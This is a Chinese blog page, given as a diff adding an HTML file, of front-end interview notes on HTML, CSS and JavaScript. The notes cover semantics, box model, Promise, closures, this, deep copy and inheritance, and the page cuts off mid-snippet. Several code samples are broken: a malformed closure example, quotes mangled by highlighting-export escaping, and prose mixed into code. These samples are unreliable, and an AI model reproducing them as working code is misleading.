@@ -1,0 +1,959 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8">
+<title>前端重要知识点汇总 - 羽叶丶</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+
+
+    <meta name="description" content="《互联网公司招聘启事的正确阅读方式》 前端面试记观看。  js 题目大部分答案可以在谷歌上搜到。 套路  举例 将不会的变成会的 侃侃而谈  HTML 押题 （必考） 你是如何理解 HTML 语义化的？第一种举例，段落用 p，边栏用 aside，主要内容用 main 标签第二种最开始是 PHP 后端写 HTML，不会 CSS，于是就用 table 来布局。table 使用展示表格的。严重违反了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端重要知识点汇总">
+<meta property="og:url" content="yuye.js.org/posts/791fb1d4/index.html">
+<meta property="og:site_name" content="羽叶丶">
+<meta property="og:description" content="《互联网公司招聘启事的正确阅读方式》 前端面试记观看。  js 题目大部分答案可以在谷歌上搜到。 套路  举例 将不会的变成会的 侃侃而谈  HTML 押题 （必考） 你是如何理解 HTML 语义化的？第一种举例，段落用 p，边栏用 aside，主要内容用 main 标签第二种最开始是 PHP 后端写 HTML，不会 CSS，于是就用 table 来布局。table 使用展示表格的。严重违反了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="/">
+<meta property="article:published_time" content="2018-07-08T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-08-04T06:17:14.392Z">
+<meta property="article:author" content="Yu Ye">
+<meta property="article:tag" content="js">
+<meta property="article:tag" content="css">
+<meta property="article:tag" content="http">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="/">
+<meta name="twitter:creator" content="@yuyehack">
+<meta name="twitter:site" content="yuyehack">
+<link rel="publisher" href="yuyehack">
+<meta property="fb:admins" content="yuyehack">
+<meta property="fb:app_id" content="yuyehack">
+
+
+
+
+
+
+
+<link id="dynamic-favicon" rel="icon" href="/images/favicon.ico">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.9.0/css/all.min.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/rainbow.css">
+
+
+    
+    
+    
+    <!-- <style>body>.footer,body>.navbar,body>.section{opacity:0}</style> -->
+    <style>body>.footer,body>.section{opacity:0}</style>
+    
+
+    
+    
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+    
+
+    
+    
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+
+    
+    
+    
+    
+
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+
+    
+    
+
+    
+    
+<script>
+var _hmt = _hmt || [];
+(function() {
+    var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?ab64af1b57db176e2599613d7c393f32";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+    
+    
+
+    
+    
+<link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+    
+    
+    
+
+    
+    
+    
+        <script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+
+<link rel="stylesheet" href="/css/style.css?v=1596521853024">
+<meta name="generator" content="Hexo 5.0.0"></head>
+<body class="is-2-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/logo.png" alt="前端重要知识点汇总" height="28">
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">首页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/music">音乐</a>
+                
+                <a class="navbar-item"
+                href="/about">关于</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+                    
+                    <div class="card">
+        
+    <div class="card-content article ">
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                前端重要知识点汇总
+            
+        </h1>
+        
+            <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+                <div class="level-left">
+                    <time class="level-item has-text-grey" datetime="2018-07-08T16:00:00.000Z">2018-07-09</time>
+                    
+                    <div class="level-item">
+                    <a class="has-link-grey -link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a>
+                    </div>
+                    
+                    
+                    <span class="level-item has-text-grey">
+                        
+                        
+                        21 分钟 读完 (大约 3192 个字)
+                    </span>
+                    
+                    
+                    <span class="level-item has-text-grey" id="busuanzi_container_page_pv">
+                        <i class="far fa-eye"></i>
+                        <span id="busuanzi_value_page_pv">0</span>次访问
+                    </span>
+                    
+                </div>
+            </div>
+            
+        <div class="content">
+                
+            
+            
+            
+
+
+
+            
+                <html><head></head><body><ol>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/33998813">《互联网公司招聘启事的正确阅读方式》</a></li>
+<li><a target="_blank" rel="noopener" href="https://juejin.im/post/587dab348d6d810058d87a0a">前端面试记</a><br>观看。</li>
+</ol>
+<h2 id="js-题目"><a href="#js-题目" class="headerlink" title="js 题目"></a>js 题目</h2><p>大部分答案可以在谷歌上搜到。</p>
+<p>套路</p>
+<ol>
+<li>举例</li>
+<li>将不会的变成会的</li>
+<li>侃侃而谈</li>
+</ol>
+<h2 id="HTML-押题"><a href="#HTML-押题" class="headerlink" title="HTML 押题"></a>HTML 押题</h2><ol>
+<li>（必考） 你是如何理解 HTML 语义化的？第一种举例，段落用 p，边栏用 aside，主要内容用 main 标签第二种最开始是 PHP 后端写 HTML，不会 CSS，于是就用 table 来布局。table 使用展示表格的。严重违反了 HTML 语义化。后来有了专门的写 CSS 的前端，他们会使用 DIV + CSS 布局，主要是用 float 和绝对定位布局。稍微符合了 HTML 语义化。再后来，前端专业化，知道 HTML 的各个标签的用法，于是会使用恰当的标签来展示内容，而不是傻傻的全用 div，会尽量使用 h1、ul、p、main、header 等标签语义化的好处是已读、有利于 SEO 等。第三种：对面试官说请看文章 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32570423">https://zhuanlan.zhihu.com/p/32570423</a></li>
+<li>meta viewport 是做什么用的，怎么写？死背：<figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag"><<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">\\\</span>"<span class="hljs-attr">viewport</span>\\\" <span class="hljs-attr">content</span>=<span class="hljs-string">\\\</span>"<span class="hljs-attr">width</span>=<span class="hljs-string">device-width,</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-attr">user-scalable</span>=<span class="hljs-string">no,</span> <span class="hljs-attr">initial-scale</span>=<span class="hljs-string">1.0,</span> <span class="hljs-attr">maximum-scale</span>=<span class="hljs-string">1.0,</span></span></span><br><span class="line"><span class="hljs-tag"><span class="hljs-attr">minimum-scale</span>=<span class="hljs-string">1.0\\\</span>"></span></span><br></pre></td></tr></tbody></table></figure>
+控制页面在移动端不要缩小显示。侃侃而谈一开始，所有页面都是给 PC 准备的，乔布斯推出 iPhone 3GS，页面是不适应手机屏幕的，所以乔布斯的工程师想了一个办法，默认把手机模拟成 980px，页面缩小。后来，智能手机普及，这个功能在部分网站不需要了，所以我们就用 meta:vp 让手机不要缩小我的网页。</li>
+<li>canvas 元素是干什么的？项目丢给他。看 MDN 的 canvas <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API">入门手册</a>。</li>
+</ol>
+<p>CSS 押题</p>
+<ol>
+<li>（必考） 说说盒模型。<ul>
+<li>举例：<br>content-box: width == 内容区宽度<br>border-box: width == 内容区宽度 + padding 宽度 + border 宽度</li>
+</ul>
+</li>
+<li>css reset 和 normalize.css 有什么区别？<ul>
+<li>考英文：<ul>
+<li>reset 重置，之前的样式我不要，a{color: red;}，抛弃默认样式</li>
+<li>normalize 让所有浏览器的标签都跟标准规定的默认样式一致，各浏览器上的标签默认样式基本统一。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>（必考）如何居中？<ul>
+<li>平时总结：<ul>
+<li>水平居中：<ul>
+<li>内联：爸爸身上写 text-align:center;</li>
+<li>块级：margin-left: auto; margin-right: auto;</li>
+</ul>
+</li>
+<li>垂直居中： <a target="_blank" rel="noopener" href="https://jscode.me/t/topic/1936">https://jscode.me/t/topic/1936</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>选择器优先级如何确定？<ol>
+<li>选择器越具体，优先级越高。 #xxx 大于 .yyy</li>
+<li>同样优先级，写在后面的覆盖前面的。</li>
+<li>color: red !important; 优先级最高。</li>
+</ol>
+</li>
+<li>BFC 是什么？<ul>
+<li>举例：<ul>
+<li>overflow:hidden 清除浮动。（方方总是用 .clearfix 清除浮动，坚决不用 overflow:hidden 清除浮动）</li>
+<li>overflow:hidden 取消父子 margin 合并。<a target="_blank" rel="noopener" href="http://jsbin.com/conulod/1/edit?html,css,js,output">http://jsbin.com/conulod/1/edit?html,css,js,output</a> （方方用 padding-top: 1px;）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>如何清除浮动？<ol>
+<li>overflow: hidden （方方反对）</li>
+<li>.clearfix 清除浮动写在爸爸身上<figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-selector-class">.clearfix</span><span class="hljs-selector-pseudo">::after</span> {</span><br><span class="line">  <span class="hljs-attribute">content</span>: \<span class="hljs-string">"\";</span></span><br><span class="line"><span class="hljs-string">  display: block;</span></span><br><span class="line"><span class="hljs-string">  clear: both;</span></span><br><span class="line"><span class="hljs-string">}</span></span><br><span class="line"><span class="hljs-string">.clearfix {</span></span><br><span class="line"><span class="hljs-string">  zoom: 1; /* IE 兼容 */</span></span><br><span class="line"><span class="hljs-string">}</span></span><br></pre></td></tr></tbody></table></figure>
+
+</li>
+</ol>
+</li>
+</ol>
+<p>JS 押题</p>
+<ol>
+<li><p>JS 有哪些数据类型？<br>string number bool undefined null object symbol<br>object 包括了数组、函数、正则、日期等对象一旦出现（数组、函数、正则、日期、NaN）直接 0 分</p>
+</li>
+<li><p>（必考） Promise 怎么使用？</p>
+<ul>
+<li>then<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(...).then(成功函数, 失败函数)</span><br></pre></td></tr></tbody></table></figure></li>
+<li>链式 then<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(...).then(成功函数, 失败函数).then(成功函数<span class="hljs-number">2</span>, 失败函数<span class="hljs-number">2</span>)</span><br></pre></td></tr></tbody></table></figure></li>
+<li>如何自己生成 Promise 对象<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xxx</span>(<span class="hljs-params"></span>)</span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, reject</span>)</span>{</span><br><span class="line">            <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">()=></span>{</span><br><span class="line">                resolve() 或者 reject()</span><br><span class="line">        },<span class="hljs-number">3000</span>)</span><br><span class="line">    })</span><br><span class="line">}</span><br><span class="line">xxx().then(...)</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+</li>
+<li><p>（必考） AJAX 手写一下？</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(\<span class="hljs-string">"POST\", \"/xxxx\");</span></span><br><span class="line"><span class="hljs-string">xhr.onreadystatechange = function() {</span></span><br><span class="line"><span class="hljs-string">        if (xhr.readyState === 4 && xhr.status === 200) {</span></span><br><span class="line"><span class="hljs-string">            console.log(xhr.responseText);</span></span><br><span class="line"><span class="hljs-string">    }</span></span><br><span class="line"><span class="hljs-string">};</span></span><br><span class="line"><span class="hljs-string">xhr.send(\"a=1&b=2\");</span></span><br></pre></td></tr></tbody></table></figure></li>
+<li><p>（必考）闭包是什么？</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)</span>{</span><br><span class="line">        <span class="hljs-keyword">var</span> n = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{</span><br><span class="line">            n += <span class="hljs-number">1</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">let</span>  adder = ()</span><br><span class="line">adder() <span class="hljs-comment">// n === 1</span></span><br><span class="line">adder() <span class="hljs-comment">// n === 2</span></span><br><span class="line"><span class="hljs-built_in">console</span>.log(n) <span class="hljs-comment">// n is not defined</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>正确参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/22486908">https://zhuanlan.zhihu.com/p/22486908</a></p>
+</li>
+<li><p>（必考）这段代码里的 this 是什么？</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> obj = {</span><br><span class="line">  foo: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">    <span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">this</span>);</span><br><span class="line">  }</span><br><span class="line">};</span><br><span class="line"><span class="hljs-keyword">var</span> bar = obj.foo;</span><br><span class="line">obj.foo(); <span class="hljs-comment">// 打印出的 this 是 obj</span></span><br><span class="line">bar(); <span class="hljs-comment">// 打印出的 this 是 window</span></span><br></pre></td></tr></tbody></table></figure>
+
+<ol>
+<li>fn() 里面的 this 就是 window</li>
+<li>fn() 是 strict mode，this 就是 undefined</li>
+<li>a.b.c.fn() 里面的 this 就是 a.b.c</li>
+<li>new F() 里面的 this 就是新生成的实例</li>
+<li>() => console.log(this) 里面 this 跟外面的 this 的值一模一样正确参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/23804247">https://zhuanlan.zhihu.com/p/23804247</a></li>
+</ol>
+</li>
+<li><p>（必考）什么是立即执行函数？使用立即执行函数的目的是什么？</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">var</span> name;</span><br><span class="line">})();</span><br><span class="line">(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">var</span> name;</span><br><span class="line">})();</span><br><span class="line">!!!!!!!(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">var</span> name;</span><br><span class="line">})();</span><br><span class="line">~(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">var</span> name;</span><br><span class="line">})();</span><br></pre></td></tr></tbody></table></figure>
+
+<p>造出一个函数作用域，防止污染全局变量</p>
+<p>ES 6 新语法</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  <span class="hljs-keyword">let</span> name;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>async/await 语法了解吗？目的是什么？</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">returnPromise</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">resolve, reject</span>) </span>{</span><br><span class="line">    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =></span> {</span><br><span class="line">      resolve(<span class="hljs-string">"fuck"</span>);</span><br><span class="line">    }, <span class="hljs-number">3000</span>);</span><br><span class="line">  });</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">returnPromise().then(<span class="hljs-function"><span class="hljs-params">result</span> =></span> {</span><br><span class="line">  result === <span class="hljs-string">"fuck"</span>;</span><br><span class="line">});</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> result = <span class="hljs-keyword">await</span> returnPromise();</span><br><span class="line">result === <span class="hljs-string">"fuck"</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>把异步代码写成同步代码。</p>
+</li>
+<li><p>如何实现深拷贝？</p>
+<ol>
+<li><p>JSON 来深拷贝</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> a = {...}</span><br><span class="line"><span class="hljs-keyword">var</span> b = <span class="hljs-built_in">JSON</span>.parse( <span class="hljs-built_in">JSON</span>.stringify(a) )</span><br></pre></td></tr></tbody></table></figure>
+<p>缺点：JSON 不支持函数、引用、undefined、RegExp、Date……</p>
+</li>
+<li><p>递归拷贝</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">clone</span>(<span class="hljs-params">object</span>)</span>{</span><br><span class="line">        <span class="hljs-keyword">var</span> object2</span><br><span class="line">    <span class="hljs-keyword">if</span>(! (object <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Object</span>) ){</span><br><span class="line">            <span class="hljs-keyword">return</span> object</span><br><span class="line">    }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(object <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Array</span>){</span><br><span class="line">            object2 = []</span><br><span class="line">    }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(object <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Function</span>){</span><br><span class="line">            object2 = <span class="hljs-built_in">eval</span>(object.toString())</span><br><span class="line">    }<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(object <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Object</span>){</span><br><span class="line">            object2 = {}</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    你也可以把 <span class="hljs-built_in">Array</span> <span class="hljs-built_in">Function</span> <span class="hljs-built_in">Object</span> 都当做 <span class="hljs-built_in">Object</span> 来看待，参考 https:<span class="hljs-comment">//juejin.im/post/587dab348d6d810058d87a0a</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> object){</span><br><span class="line">            object2[key] = clone(object[key])</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> object2</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>环</p>
+</li>
+<li><p>RegExp、Date、Set、Symbol、WeakMap</p>
+</li>
+</ol>
+</li>
+<li><p>如何实现数组去重？</p>
+<ol>
+<li>计数排序的逻辑<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> a = [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];</span><br><span class="line"><span class="hljs-keyword">var</span> hashTab = {};</span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i < a.length; i++) {</span><br><span class="line">  <span class="hljs-keyword">if</span> (a[i] <span class="hljs-keyword">in</span> hashTab) {</span><br><span class="line">    <span class="hljs-comment">// 什么也不做</span></span><br><span class="line">  } <span class="hljs-keyword">else</span> {</span><br><span class="line">    hashTab[a[i]] = <span class="hljs-literal">true</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//hashTab: {4: true, 2: true, 5: true, 6:true, 3: true}</span></span><br><span class="line"><span class="hljs-built_in">console</span>.log(<span class="hljs-built_in">Object</span>.keys(hashTab)); <span class="hljs-comment">// ['4','2','5','6','3']</span></span><br></pre></td></tr></tbody></table></figure></li>
+<li>Set 去重<br><code>js Array.from(new Set(a));</code><br>或者<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deArr</span>(<span class="hljs-params">arr</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> [...new <span class="hljs-built_in">Set</span>(arr)];</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">var</span> a = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">35</span>, <span class="hljs-number">5</span>, <span class="hljs-number">47</span>, <span class="hljs-number">8</span>, <span class="hljs-number">57</span>, <span class="hljs-number">4</span>, <span class="hljs-number">54</span>, <span class="hljs-number">54</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>];</span><br><span class="line"><span class="hljs-built_in">console</span>.log(deArr(a));</span><br><span class="line"><span class="hljs-comment">//[1, 2, 35, 5, 47, 8, 57, 4, 54]</span></span><br></pre></td></tr></tbody></table></figure></li>
+<li>WeakMap 任意类型去重</li>
+</ol>
+</li>
+<li><p>如何用正则实现 string.trim() ？</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trim</span>(<span class="hljs-params">string</span>) </span>{</span><br><span class="line">        <span class="hljs-keyword">return</span> string.replace(<span class="hljs-regexp">/^\\\\s+|\\\\s+$/g</span>, \<span class="hljs-string">"\");</span></span><br><span class="line"><span class="hljs-string">}</span></span><br></pre></td></tr></tbody></table></figure></li>
+<li><p>JS 原型是什么？</p>
+<ul>
+<li>举例<ol>
+<li>var a = [1,2,3]</li>
+<li>只有 0、1、2、length 4 个 key</li>
+<li>为什么可以 a.push(4) ，push 是哪来的？</li>
+<li>a.<strong>proto</strong> === Array.prototype</li>
+<li>push 就是沿着 a.<strong>proto</strong> 找到的，也就是 Array.prototype.push</li>
+<li>Array.prototype 还有很多方法，如 join、pop、slice、splice</li>
+<li>Array.prototype 就是 a 的原型（<strong>proto</strong>）参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/23090041">https://zhuanlan.zhihu.com/p/23090041</a></li>
+</ol>
+</li>
+</ul>
+</li>
+<li><p>ES 6 中的 class 了解吗？</p>
+<ul>
+<li>把 MDN class 章节看完</li>
+<li>记住一个例子</li>
+</ul>
+</li>
+<li><p>JS 如何实现继承？</p>
+<ul>
+<li><p>原型链</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Animal</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">        <span class="hljs-built_in">this</span>.body = \<span class="hljs-string">"肉体\";</span></span><br><span class="line"><span class="hljs-string">}</span></span><br><span class="line"><span class="hljs-string">Animal.prototype.move = function() {};</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">function Human(name) {</span></span><br><span class="line"><span class="hljs-string">        Animal.apply(this, arguments);</span></span><br><span class="line"><span class="hljs-string">    this.name = name;</span></span><br><span class="line"><span class="hljs-string">}</span></span><br><span class="line"><span class="hljs-string">// Human.prototype.__proto__ = Animal.prototype // 非法</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">var f = function() {};</span></span><br><span class="line"><span class="hljs-string">f.prototype = Animal.prototype;</span></span><br><span class="line"><span class="hljs-string">Human.prototype = new f();</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">Human.prototype.useTools = function() {};</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">var frank = new Human();</span></span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>extends 关键字</p>
+<figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span></span>{</span><br><span class="line">        <span class="hljs-keyword">constructor</span>(){</span><br><span class="line">            <span class="hljs-built_in">this</span>.body = <span class="hljs-string">'肉体'</span></span><br><span class="line">    },</span><br><span class="line">    move(){}</span><br><span class="line">}</span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span 